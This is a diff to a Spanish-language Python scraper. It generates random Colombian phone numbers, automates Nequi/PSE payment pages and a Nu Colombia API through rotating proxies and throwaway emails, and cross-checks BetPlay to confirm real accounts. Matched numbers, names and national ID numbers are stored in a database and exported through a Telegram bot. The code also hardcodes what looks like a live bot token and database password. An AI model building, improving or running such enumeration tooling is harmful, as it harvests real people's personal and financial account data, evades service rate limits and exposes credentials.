@@ -6,22 +6,30 @@ import random
 import re
 import sys
 import time
+import traceback
 import uuid
 from collections import deque
+from datetime import datetime
 from typing import Dict, Tuple, Optional
 
 import aiohttp
-# --- CORRECCIÓN IMPORTANTE ---
-from aiohttp import ClientTimeout 
-# ----------------------------
+from aiohttp import ClientTimeout
 from playwright.async_api import async_playwright
 
-# --- DB CHANGE: Imports para SQLAlchemy 2.0 ---
-from sqlalchemy import create_engine, Column, Integer, String, DateTime
+from sqlalchemy import create_engine, Column, Integer, String, DateTime, update
 from sqlalchemy.orm import declarative_base, sessionmaker
-from datetime import datetime
+from sqlalchemy.exc import IntegrityError
 
-logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
+# ======================================================================
+#  LOGS SIN BUFFER (clave para ver todo en Railway)
+# ======================================================================
+try:
+    sys.stdout.reconfigure(line_buffering=True)
+    sys.stderr.reconfigure(line_buffering=True)
+except Exception:
+    pass
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("extractor")
 
 # ======================================================================
@@ -34,7 +42,7 @@ ROTAR_SESION    = True
 PAIS            = "co"
 X_CUSTOM_VERSION = "4.0.71"
 
-CONCURRENCIA = 5
+CONCURRENCIA = 3
 LIMITE       = None
 
 TELEGRAM_TOKEN   = "8005799410:AAGe720T8KDkwL9v32ldhMpWitHzANN3Wwk"
@@ -60,12 +68,6 @@ PREFIJOS_PESO = {
 }
 PREFIJOS_SET = set(PREFIJOS_PESO)
 
-# Variables de archivo eliminadas (se reemplazan por DB)
-# ARCHIVO_USADOS = "celulares_usados.txt"
-# ARCHIVO_EXISTENTES = "existentes.txt"
-# ARCHIVO_NUMEROS = "numeros_telegram.txt"
-# ARCHIVO_STATS = "stats.json"
-
 UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
 
@@ -74,15 +76,29 @@ PROXIES = [
 ]
 
 # ======================================================================
-#  DATABASE SETUP (SQLAlchemy)
+#  DATABASE SETUP (SQLAlchemy) — URL interna, con fallback público
 # ======================================================================
-DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@127.0.0.1:5432/checker")
+DATABASE_URL = os.getenv(
+    "DATABASE_URL",
+    "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@postgres.railway.internal:5432/railway"
+)
+if DATABASE_URL.startswith("postgres://"):
+    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
+# La URL pública (proxy) exige SSL; la interna no
+if "proxy.rlwy.net" in DATABASE_URL and "sslmode" not in DATABASE_URL:
+    DATABASE_URL += ("&" if "?" in DATABASE_URL else "?") + "sslmode=require"
 
-engine = create_engine(DATABASE_URL, pool_size=5, max_overflow=10, pool_pre_ping=True)
+engine = create_engine(
+    DATABASE_URL,
+    pool_size=5,
+    max_overflow=10,
+    pool_pre_ping=True,
+    pool_recycle=300,
+)
 SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
 Base = declarative_base()
 
-# Tablas
+
 class FoundNumber(Base):
     __tablename__ = "found_numbers"
     id = Column(Integer, primary_key=True, index=True)
@@ -92,6 +108,7 @@ class FoundNumber(Base):
     cedula = Column(String(50))
     created_at = Column(DateTime, default=datetime.utcnow)
 
+
 class Stats(Base):
     __tablename__ = "stats"
     id = Column(Integer, primary_key=True, index=True)
@@ -99,14 +116,55 @@ class Stats(Base):
     aciertos = Column(Integer, default=0)
     updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
+
+class KV(Base):
+    __tablename__ = "kv"
+    key = Column(String(50), primary_key=True)
+    value = Column(String(500))
+
+
 Base.metadata.create_all(bind=engine)
 
-def get_db():
+
+def guardar_kv(k, v):
     db = SessionLocal()
     try:
-        yield db
+        row = db.query(KV).filter(KV.key == k).first()
+        if row:
+            row.value = str(v)
+        else:
+            db.add(KV(key=k, value=str(v)))
+        db.commit()
+    except Exception as e:
+        db.rollback()
+        print(f"[!] guardar_kv: {e}")
     finally:
         db.close()
+
+
+def leer_kv(k, default=None):
+    db = SessionLocal()
+    try:
+        row = db.query(KV).filter(KV.key == k).first()
+        return row.value if row else default
+    except Exception:
+        return default
+    finally:
+        db.close()
+
+
+def ensure_stats_row():
+    db = SessionLocal()
+    try:
+        if not db.query(Stats).first():
+            db.add(Stats(intentos=0, aciertos=0))
+            db.commit()
+    except Exception as e:
+        db.rollback()
+        print(f"[!] ensure_stats_row: {e}")
+    finally:
+        db.close()
+
 
 # ======================================================================
 #  RETRY DNS
@@ -124,10 +182,12 @@ async def _goto_con_retry(page, url, intentos=3):
             raise
     return False
 
+
 # ======================================================================
-#  CORREOS ROTATIVOS
+#  CORREOS ROTATIVOS (índice persistido en DB)
 # ======================================================================
 _indice_correo = 0
+
 
 def _lista_correos():
     global CORREOS
@@ -137,28 +197,33 @@ def _lista_correos():
                 CORREOS.append(f"{nombre}{suf}@gmail.com")
     return CORREOS
 
+
 def correo_actual() -> str:
     lst = _lista_correos()
     return lst[_indice_correo % len(lst)]
 
+
 def avanzar_correo() -> str:
     global _indice_correo
     _indice_correo += 1
+    try:
+        guardar_kv("indice_correo", _indice_correo)
+    except Exception:
+        pass
     nuevo = correo_actual()
     print(f"[i] Correo cambiado -> {nuevo}")
     return nuevo
 
+
 def cargar_correo_guardado():
     global _indice_correo
     try:
-        if os.path.exists("correo_actual.txt"):
-            with open("correo_actual.txt", encoding="utf-8") as f:
-                guardado = f.read().strip()
-            lst = _lista_correos()
-            if guardado in lst:
-                _indice_correo = lst.index(guardado) + 1
+        guardado = leer_kv("indice_correo")
+        if guardado is not None:
+            _indice_correo = int(guardado)
     except Exception:
         pass
+
 
 # ======================================================================
 #  CHECKER BETPLAY
@@ -178,6 +243,7 @@ HEADERS = {
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-origin",
 }
+
 
 class BetplayChecker:
     def __init__(self):
@@ -234,23 +300,34 @@ class BetplayChecker:
                 continue
         return False, {"error": "Max retries"}
 
+
 # ======================================================================
-#  MEMORIA / ESTADÍSTICAS (DB)
+#  MEMORIA / ESTADÍSTICAS (DB, con UPDATE atómico)
 # ======================================================================
 class MemoriaDB:
     def __init__(self):
-        pass 
+        pass
+
+    @property
+    def data(self):
+        db = SessionLocal()
+        try:
+            s = db.query(Stats).first()
+            return {"intentos": s.intentos if s else 0,
+                    "aciertos": s.aciertos if s else 0}
+        finally:
+            db.close()
 
     async def registrar(self, celular, exito):
         db = SessionLocal()
         try:
-            stats = db.query(Stats).first()
-            if not stats:
-                stats = Stats(intentos=0, aciertos=0)
-                db.add(stats)
-            stats.intentos += 1
-            if exito:
-                stats.aciertos += 1
+            db.execute(
+                update(Stats).values(
+                    intentos=Stats.intentos + 1,
+                    aciertos=Stats.aciertos + (1 if exito else 0),
+                    updated_at=datetime.utcnow(),
+                )
+            )
             db.commit()
         except Exception as e:
             print(f"[!] Error DB registrar: {e}")
@@ -282,7 +359,9 @@ class MemoriaDB:
         finally:
             db.close()
 
+
 mem = MemoriaDB()
+
 
 # ======================================================================
 #  TELEGRAM
@@ -293,6 +372,7 @@ def contar_existentes() -> int:
         return db.query(FoundNumber).count()
     finally:
         db.close()
+
 
 class Telegram:
     def __init__(self, token, chat_id=""):
@@ -311,10 +391,16 @@ class Telegram:
             return
         self.session = aiohttp.ClientSession(timeout=ClientTimeout(total=10))
         try:
-            async with self.session.get(self.url("getUpdates"), params={"timeout": 0}, timeout=ClientTimeout(total=10)) as r:
+            off = leer_kv("tg_offset")
+            if off is not None:
+                self.offset = int(off)
+            async with self.session.get(self.url("getUpdates"),
+                                        params={"timeout": 0},
+                                        timeout=ClientTimeout(total=10)) as r:
                 data = await r.json()
             for upd in data.get("result", []):
                 self.offset = upd["update_id"] + 1
+            guardar_kv("tg_offset", self.offset)
         except Exception as e:
             print(f"[!] Error inicializando Telegram: {e}")
 
@@ -357,15 +443,18 @@ class Telegram:
         await self._api("editMessageText", {"chat_id": self.chat_id,
                                             "message_id": msg_id, "text": texto})
 
-    async def enviar_documento(self, contenido, caption="", chat_id=None):
+    async def enviar_documento(self, contenido, caption="", chat_id=None, filename="datos.txt"):
         cid = chat_id or self.chat_id
         if not cid:
             return
         try:
-            timeout = ClientTimeout(total=60)
-            async with self.session.post(self.url("sendDocument"), 
-                                         json={"chat_id": cid, "caption": caption, "parse_mode": "HTML"},
-                                         data={"document": contenido}, timeout=timeout) as r:
+            form = aiohttp.FormData()
+            form.add_field("chat_id", str(cid))
+            form.add_field("caption", caption)
+            form.add_field("parse_mode", "HTML")
+            form.add_field("document", contenido, filename=filename)
+            async with self.session.post(self.url("sendDocument"), data=form,
+                                         timeout=ClientTimeout(total=60)) as r:
                 return await r.json()
         except Exception as e:
             logger.error(f"Send document error: {e}")
@@ -394,19 +483,17 @@ class Telegram:
         msg = upd.get("message") or {}
         texto = (msg.get("text") or "").strip()
         chat_id = str((msg.get("chat") or {}).get("id", ""))
-        
+
         print(f"[DEBUG TELEGRAM] Recibido: '{texto}' de ChatID: {chat_id}")
-        
+
         if not texto or not chat_id:
             return
-        
-        # ACTUALIZAR CHAT_ID INMEDIATAMENTE
+
         if not self.chat_id:
             self.chat_id = chat_id
             print(f"[DEBUG TELEGRAM] ChatID guardado: {self.chat_id}")
 
         cmd = texto.split()[0].split("@")[0].lower()
-
         print(f"[DEBUG TELEGRAM] Comando detectado: {cmd}")
 
         if cmd in ("/start", "/ayuda", "/help"):
@@ -427,7 +514,9 @@ class Telegram:
                 registros = db.query(FoundNumber).all()
                 contenido = "\n".join([f"{r.ref3} | {r.celular}" for r in registros])
                 if contenido:
-                    await self.enviar_documento(contenido.encode('utf-8'), caption=f"existentes.txt ({len(registros)} registros)", chat_id=chat_id)
+                    await self.enviar_documento(contenido.encode('utf-8'),
+                                                caption=f"existentes.txt ({len(registros)} registros)",
+                                                chat_id=chat_id, filename="existentes.txt")
                 else:
                     await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
             except Exception as e:
@@ -441,13 +530,14 @@ class Telegram:
                 registros = db.query(FoundNumber).all()
                 nums = []
                 for r in registros:
-                    celular = r.celular
-                    d = re.sub(r"\D", "", celular)
+                    d = re.sub(r"\D", "", r.celular)
                     if len(d) >= 10:
                         nums.append("57" + d[-10:])
                 contenido = "\n".join(nums)
                 if contenido:
-                    await self.enviar_documento(contenido.encode('utf-8'), caption=f"{len(nums)} números en formato 57", chat_id=chat_id)
+                    await self.enviar_documento(contenido.encode('utf-8'),
+                                                caption=f"{len(nums)} números en formato 57",
+                                                chat_id=chat_id, filename="numeros_telegram.txt")
                 else:
                     await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
             except Exception as e:
@@ -478,19 +568,27 @@ class Telegram:
             return
         while True:
             try:
-                timeout = ClientTimeout(total=40)
                 async with self.session.get(self.url("getUpdates"),
                                             params={"timeout": 30, "offset": self.offset},
-                                            timeout=timeout) as r:
+                                            timeout=ClientTimeout(total=40)) as r:
                     data = await r.json()
                 for upd in data.get("result", []):
                     self.offset = upd["update_id"] + 1
-                    await self.procesar_update(upd)
+                    try:
+                        await self.procesar_update(upd)
+                    except Exception:
+                        traceback.print_exc()
+                if data.get("result"):
+                    guardar_kv("tg_offset", self.offset)
+            except asyncio.CancelledError:
+                raise
             except Exception as e:
                 logger.error(f"Error en polling: {e}")
                 await asyncio.sleep(2)
 
+
 tg = Telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
+
 
 # ======================================================================
 #  PROXIES
@@ -515,6 +613,7 @@ def cargar_proxies():
                     lista.append({"server": f"http://{host}:{port}"})
     return lista
 
+
 def preparar_proxy(proxy):
     if not proxy:
         return None
@@ -527,36 +626,42 @@ def preparar_proxy(proxy):
             px["password"] = px["password"] + f"_session-{sid}"
     return px
 
+
 # ======================================================================
 #  GENERACIÓN INTELIGENTE
 # ======================================================================
-_pila_vecinos = deque()
+_pila_vecinos = deque(maxlen=20000)
 _usados_cache = None
+
 
 def _usados():
     global _usados_cache
     if _usados_cache is None:
-        _usados_cache = set()
-        db = SessionLocal()
-        try:
-            usados_db = db.query(FoundNumber.celular).all()
-            _usados_cache = {r[0] for r in usados_db}
-        finally:
-            db.close()
+        recargar_usados()
     return _usados_cache
+
+
+def recargar_usados():
+    global _usados_cache
+    db = SessionLocal()
+    try:
+        _usados_cache = {r[0] for r in db.query(FoundNumber.celular).all()}
+    finally:
+        db.close()
+
 
 def _marcar_usado(n):
     _usados().add(n)
 
+
 def _valido(s):
     return s[:3] in PREFIJOS_SET and s not in _usados()
 
-def _prefijo_aprendido():
-    return None 
 
 def generar_aleatorio():
     pref = random.choices(list(PREFIJOS_PESO), weights=list(PREFIJOS_PESO.values()))[0]
     return pref + "".join(random.choice("0123456789") for _ in range(7))
+
 
 PUENTES = {"300": ("301", "310"), "301": ("300", "310"), "310": ("311", "313"),
            "311": ("310", "312"), "312": ("311", "313"), "313": ("312", "314"),
@@ -564,6 +669,7 @@ PUENTES = {"300": ("301", "310"), "301": ("300", "310"), "310": ("311", "313"),
            "317": ("316", "318"), "318": ("317", "319"), "319": ("318", "320"),
            "320": ("319", "321"), "321": ("320", "322"), "322": ("321", "323"),
            "323": ("322", "324"), "324": ("323",)}
+
 
 def agregar_vecinos(celular):
     base = int(celular)
@@ -584,6 +690,7 @@ def agregar_vecinos(celular):
             _pila_vecinos.appendleft(s)
             vistos.add(s)
 
+
 def siguiente_celular():
     while _pila_vecinos:
         c = _pila_vecinos.popleft()
@@ -595,6 +702,7 @@ def siguiente_celular():
         if _valido(c):
             _marcar_usado(c)
             return c
+
 
 # ======================================================================
 #  HELPERS DE NAVEGACIÓN
@@ -608,6 +716,7 @@ async def leer_texto(page):
             pass
     return "\n".join(partes)
 
+
 async def clic_si_existe(page, texto, timeout=4000):
     try:
         b = page.locator(f'button:has-text("{texto}")').first
@@ -617,6 +726,7 @@ async def clic_si_existe(page, texto, timeout=4000):
     except Exception:
         return False
 
+
 async def clic_inmediato(page, texto, timeout=8000):
     try:
         b = page.locator(f'button:has-text("{texto}")').first
@@ -625,6 +735,7 @@ async def clic_inmediato(page, texto, timeout=8000):
         return True
     except Exception:
         return False
+
 
 async def texto_modal(page):
     for fr in page.frames:
@@ -636,6 +747,7 @@ async def texto_modal(page):
             pass
     return ""
 
+
 def clasificar_modal(msg):
     if "no tiene una cuenta" in msg:
         return "sin_cuenta"
@@ -644,6 +756,7 @@ def clasificar_modal(msg):
     if "30 minutos" in msg or "límite" in msg:
         return "bloqueo"
     return "sin_cuenta"
+
 
 async def resolver_paso_nequi(page, context, timeout=25000):
     fin = asyncio.get_event_loop().time() + timeout / 1000
@@ -674,6 +787,7 @@ async def resolver_paso_nequi(page, context, timeout=25000):
                 pass
         await page.wait_for_timeout(250)
     return "timeout"
+
 
 JS_PSE_RAPIDO = """
 async (correo) => {
@@ -742,6 +856,7 @@ async (authId) => {
 }
 """
 
+
 def _buscar_valor(obj, claves):
     if isinstance(obj, dict):
         for k, v in obj.items():
@@ -757,7 +872,9 @@ def _buscar_valor(obj, claves):
                 return r
     return None
 
+
 NU_HADOU = "https://prod-global-global-hadou.prod-waf.nu.com.co/api"
+
 
 async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
     session = aiohttp.ClientSession(
@@ -792,9 +909,11 @@ async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
     finally:
         await session.close()
 
+
 def buscar_campo(data, claves):
+    # FIX: antes usaba "obj" (NameError)
     if isinstance(data, dict):
-        for k, v in obj.items():
+        for k, v in data.items():
             if isinstance(v, (str, int)) and any(c in str(k).lower() for c in claves) and str(v).strip():
                 return str(v)
         for v in data.values():
@@ -808,11 +927,13 @@ def buscar_campo(data, claves):
                 return r
     return ""
 
+
 def telefono_coincide(celular: str, tel_betplay: str) -> bool:
     tel_digits = re.sub(r"\D", "", str(tel_betplay))
     if len(tel_digits) < 6:
         return False
     return tel_digits[:3] == celular[:3] and tel_digits[-3:] == celular[-3:]
+
 
 async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
     print(f"[?] Probando referencia {referencia} en BetPlay...")
@@ -820,7 +941,7 @@ async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
     if not await checker.init_session():
         print("[!] No se pudo conectar a BetPlay")
         return False
-    
+
     db = SessionLocal()
     try:
         valido, datos = await checker.verificar_documento(referencia)
@@ -828,37 +949,38 @@ async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
         if not valido:
             print(f"[NO] referencia {referencia} no registrada en BetPlay")
             return False
-            
+
         tel = buscar_campo(datos, ("phone", "cel", "tel", "movil", "mobile"))
         if not tel:
             print(f"[~] ref {referencia} registrada pero sin teléfono en el JSON")
             return False
-            
+
         if telefono_coincide(celular, tel):
             existente = db.query(FoundNumber).filter(FoundNumber.celular == celular).first()
-            if not existente:
-                nuevo_registro = FoundNumber(
-                    celular=celular,
-                    ref3=referencia,
-                    nombre=nombre,
-                    cedula=cedula
-                )
+            if existente:
+                print(f"[EXISTENTE DB] celular {celular} ya guardado anteriormente.")
+                return True
+            nuevo_registro = FoundNumber(celular=celular, ref3=referencia,
+                                         nombre=nombre, cedula=cedula)
+            try:
                 db.add(nuevo_registro)
                 db.commit()
                 db.refresh(nuevo_registro)
-                
-                print(f"[EXISTENTE DB] ref {referencia} -> {celular} GUARDADO")
-                await tg.notificar_guardado(celular, referencia)
+            except IntegrityError:
+                db.rollback()
+                print(f"[EXISTENTE DB] {celular} insertado por otro worker.")
                 return True
-            else:
-                print(f"[EXISTENTE DB] celular {celular} ya guardado anteriormente.")
-                return True
+            _marcar_usado(celular)
+            print(f"[EXISTENTE DB] ref {referencia} -> {celular} GUARDADO")
+            await tg.notificar_guardado(celular, referencia, nombre)
+            return True
         else:
             print(f"[~] ref {referencia} existe pero teléfono no coincide (tel {tel})")
             return False
     finally:
         await checker.close()
         db.close()
+
 
 async def _buscar_pagina(context, patron):
     for pg in context.pages:
@@ -869,6 +991,7 @@ async def _buscar_pagina(context, patron):
             pass
     return None
 
+
 async def _esperar_pagina(context, patron, timeout=30):
     fin = asyncio.get_event_loop().time() + timeout
     while asyncio.get_event_loop().time() < fin:
@@ -877,6 +1000,7 @@ async def _esperar_pagina(context, patron, timeout=30):
             return pg
         await asyncio.sleep(0.3)
     return None
+
 
 async def ejecutar(celular, proxy=None):
     """'ok' | 'sin_cuenta' | 'bloqueo' | 'sin_ref' | 'correo_agotado' | 'error'"""
@@ -889,11 +1013,7 @@ async def ejecutar(celular, proxy=None):
             headless=not MOSTRAR_VENTANA,
             slow_mo=SLOW_MO,
             proxy=proxy,
-            args=[
-                "--disable-gpu",
-                "--no-sandbox",
-                "--disable-dev-shm-usage"
-            ]
+            args=["--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage"]
         )
         context = await browser.new_context(
             viewport={'width': 1280, 'height': 900}, user_agent=UA_BROWSER)
@@ -955,8 +1075,7 @@ async def ejecutar(celular, proxy=None):
                     break
                 await page.wait_for_timeout(250)
             if capturado["put"] is not None:
-                print(f"[i] PUT COMPLETO: "
-                      f"{json.dumps(capturado['put'], ensure_ascii=False)}")
+                print(f"[i] PUT COMPLETO: {json.dumps(capturado['put'], ensure_ascii=False)}")
 
             page_pse = await _esperar_pagina(context, "pse.com.co", timeout=30)
             if not page_pse:
@@ -1042,7 +1161,12 @@ async def ejecutar(celular, proxy=None):
             print(f"[!] Error {celular}: {e}")
             return "error"
         finally:
+            try:
+                await context.close()
+            except Exception:
+                pass
             await browser.close()
+
 
 async def procesar_un_celular(celular):
     proxys = cargar_proxies() if USAR_PROXY else [None]
@@ -1059,51 +1183,89 @@ async def procesar_un_celular(celular):
             break
     return "error"
 
+
 # ======================================================================
-#  WORKERS
+#  WORKERS + SUPERVISIÓN (nunca se cae)
 # ======================================================================
 intentos_total = 0
+
 
 async def worker(n):
     global intentos_total
     while True:
-        if LIMITE is not None and intentos_total >= LIMITE:
-            return
-        celular = siguiente_celular()
-        intentos_total += 1
-        print(f"\n===== [W{n}] Intento {intentos_total} | celular: {celular} =====")
         try:
-            estado = await procesar_un_celular(celular)
-        except Exception as e:
-            print(f"[W{n}] error {celular}: {e}")
-            estado = "error"
+            if LIMITE is not None and intentos_total >= LIMITE:
+                return
+            celular = siguiente_celular()
+            intentos_total += 1
+            print(f"\n===== [W{n}] Intento {intentos_total} | celular: {celular} =====")
 
-        exito = estado in ("ok", "sin_ref")
-        await mem.registrar(celular, exito)
-        if exito:
-            agregar_vecinos(celular)
+            try:
+                estado = await procesar_un_celular(celular)
+            except Exception as e:
+                print(f"[W{n}] error {celular}: {e}")
+                estado = "error"
 
-        if intentos_total % 25 == 0:
-            print(f"[mem] Tasa actual: {mem.tasa_acierto()*100:.2f}% "
-                  f"({mem.data['aciertos']}/{mem.data['intentos']})")
+            exito = estado in ("ok", "sin_ref")
+            try:
+                await mem.registrar(celular, exito)
+            except Exception as e:
+                print(f"[W{n}] error registrando stats: {e}")
+
+            if exito:
+                agregar_vecinos(celular)
+
+            if intentos_total % 25 == 0:
+                print(f"[mem] Tasa actual: {mem.tasa_acierto()*100:.2f}% "
+                      f"({mem.data['aciertos']}/{mem.data['intentos']})")
+
+            if intentos_total % 500 == 0:
+                recargar_usados()
+
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            traceback.print_exc()
+            await asyncio.sleep(1)
+
+
+async def _worker_supervisado(n):
+    while True:
+        try:
+            await worker(n)
+            return
+        except Exception:
+            traceback.print_exc()
+            await asyncio.sleep(2)
+
+
+async def _poll_supervisado():
+    while True:
+        try:
+            await tg.poll()
+            return
+        except Exception:
+            traceback.print_exc()
+            await asyncio.sleep(3)
+
 
 async def main():
     cargar_correo_guardado()
-    # _sembrar_desde_memoria() # Simplificado para DB
+    ensure_stats_row()
 
     arg = sys.argv[1] if len(sys.argv) > 1 else None
     if arg and arg.isdigit() and len(arg) >= 10:
         _marcar_usado(arg)
         _pila_vecinos.appendleft(arg)
 
-    # INICIALIZACIÓN SEGURA DE TELEGRAM
     try:
         await tg.start()
     except Exception as e:
         print(f"[!] Error iniciando Telegram: {e}")
 
+    tareas = []
     if tg.activo:
-        asyncio.create_task(tg.poll())
+        tareas.append(asyncio.create_task(_poll_supervisado()))
         try:
             await tg.actualizar_contador()
         except Exception as e:
@@ -1115,7 +1277,11 @@ async def main():
     print(f"[i] Correo inicial: {correo_actual()}")
     print(f"[i] Tasa histórica: {mem.tasa_acierto()*100:.2f}%")
     print(f"[i] Concurrencia: {CONCURRENCIA} | Límite: {LIMITE or 'infinito'}")
-    await asyncio.gather(*[worker(i + 1) for i in range(CONCURRENCIA)])
+    print(f"[i] Cuentas en DB: {contar_existentes()}")
+
+    tareas += [asyncio.create_task(_worker_supervisado(i + 1)) for i in range(CONCURRENCIA)]
+    await asyncio.gather(*tareas, return_exceptions=True)
+
 
 if __name__ == "__main__":
     print(">>> INICIANDO CON DB ...")
@@ -1124,6 +1290,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\n[!] Detenido por el usuario (Ctrl+C)")
     except Exception:
-        import traceback
         traceback.print_exc()
     print(">>> FIN")
